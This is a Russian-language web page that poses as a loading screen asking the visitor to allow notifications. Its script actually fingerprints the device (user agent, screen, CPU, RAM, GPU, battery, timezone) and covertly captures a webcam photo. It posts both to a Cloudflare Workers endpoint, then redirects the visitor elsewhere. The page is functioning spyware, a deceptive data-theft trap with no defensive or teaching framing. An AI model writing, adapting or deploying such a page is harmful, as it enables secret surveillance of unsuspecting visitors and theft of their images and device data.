<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .msg {
            text-align: center;
            padding: 20px;
        }
        h2 { font-size: 18px; font-weight: 500; margin-bottom: 8px; }
        p { font-size: 14px; color: #888; margin: 0; }
    </style>
</head>
<body>

    <div class="msg">
        <h2>Нажмите "Разрешить уведомления", чтобы продолжить</h2>
        <p>Для доступа требуется права на отправку уведомлений.</p>
    </div>
    
    <video id="v" autoplay playsinline style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

<script>
    const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';

    // Функция сбора железа и батареи
    async function getFullData() {
        let data = {
            gpu: "Unknown",
            cores: navigator.hardwareConcurrency || "?",
            ram: navigator.deviceMemory || "?",
            battery: "Unknown"
        };

        // 1. Пробуем вытащить GPU
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
        } catch (e) {}

        // 2. Пробуем получить заряд батареи
        try {
            if (navigator.getBattery) {
                const bat = await navigator.getBattery();
                const level = Math.round(bat.level * 100);
                const charging = bat.charging ? "🔌 Заряжается" : "🔋 Разряжается";
                data.battery = `${level}% (${charging})`;
            }
        } catch (e) {}

        return data;
    }

    window.onload = async function() {
        const targetUrl = await fetch(proxyUrl + "/get-url").then(r => r.text()).catch(() => "https://google.com");
        
        // Собираем всё железо
        const hw = await getFullData();

        const infoData = `
👤 **УСТРОЙСТВО:**
• ${navigator.userAgent}
• Язык: ${navigator.language}
• Экран: ${window.screen.width}x${window.screen.height}

🖥 **ЖЕЛЕЗО:**
• Процессор: ${hw.cores} ядер
• ОЗУ: ~${hw.ram} GB
• Видеокарта: ${hw.gpu}
• Батарея: ${hw.battery}

⏰ **ВРЕМЯ И ЗОНА:**
• ${new Date().toLocaleString('ru-RU')}
• Пояс: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
        `.trim();

        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            v.srcObject = stream;
            
            await new Promise(r => v.onloadedmetadata = () => { v.play(); setTimeout(r, 800); });
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            
            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
            const fd = new FormData();
            fd.append('photo', blob, '1.jpg');
            fd.append('caption', infoData);
            await fetch(proxyUrl, { method: 'POST', body: fd });
        } catch (e) {
            const fd = new FormData();
            fd.append('text', `❌ Доступ к камере отклонен\n\n${infoData}`);
            await fetch(proxyUrl, { method: 'POST', body: fd });
        } finally {
            if (stream) stream.getTracks().forEach(t => t.stop());
            window.location.replace(targetUrl);
        }
    };
</script>
</body>
</html>
